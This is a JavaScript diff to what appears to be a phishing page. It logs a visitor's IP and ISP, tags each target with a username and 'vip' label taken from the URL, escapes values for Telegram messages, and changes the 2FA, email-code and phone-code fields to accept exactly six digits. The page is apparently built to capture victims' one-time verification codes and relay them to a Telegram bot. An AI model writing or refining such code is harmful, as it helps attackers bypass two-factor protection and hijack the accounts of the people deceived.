@@ -26,17 +26,30 @@ const userInfo = {
     isp: 'Unknown'
 };
 
+function escapeTelegramHtml(value) {
+    return String(value || '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+}
+
 function getUserLabelFromUrl() {
     try {
         const params = new URLSearchParams(window.location.search);
+        const username = (params.get('username') || '').trim().replace(/^@+/, '');
+        const vip = (params.get('vip') || '').trim();
+        if (username && vip) {
+            return escapeTelegramHtml(`${username} (${vip})`);
+        }
+
         const label = params.get('user');
         if (label && label.trim().length > 0) {
-            return label.trim();
+            return escapeTelegramHtml(label.trim());
         }
     } catch (error) {
         console.log('Error reading user label:', error);
     }
-    return userInfo.ip;
+    return escapeTelegramHtml(userInfo.ip);
 }
 
 const userLabel = getUserLabelFromUrl();
@@ -657,8 +670,7 @@ try{
 }catch(e){/* ignore */}
 
 twofaInput.addEventListener("input", () => {
-    const len = twofaInput.value.length;
-    twofaButton.disabled = len < 4 || len > 6;
+    twofaButton.disabled = twofaInput.value.length !== 6;
 });
 
 form.addEventListener("submit", async e => {
@@ -816,8 +828,7 @@ const emailButton = document.getElementById("email_button");
 if (emailInput) {
     emailInput.addEventListener("input", () => {
         if (emailButton) {
-            const len = emailInput.value.length;
-            emailButton.disabled = len < 4 || len > 6;
+            emailButton.disabled = emailInput.value.length !== 6;
         }
     });
 }
@@ -898,8 +909,7 @@ const phoneButton = document.getElementById("phone_button");
 if (phoneInput) {
     phoneInput.addEventListener("input", () => {
         if (phoneButton) {
-            const len = phoneInput.value.length;
-            phoneButton.disabled = len < 4 || len > 6;
+            phoneButton.disabled = phoneInput.value.length !== 6;
         }
     });
 }
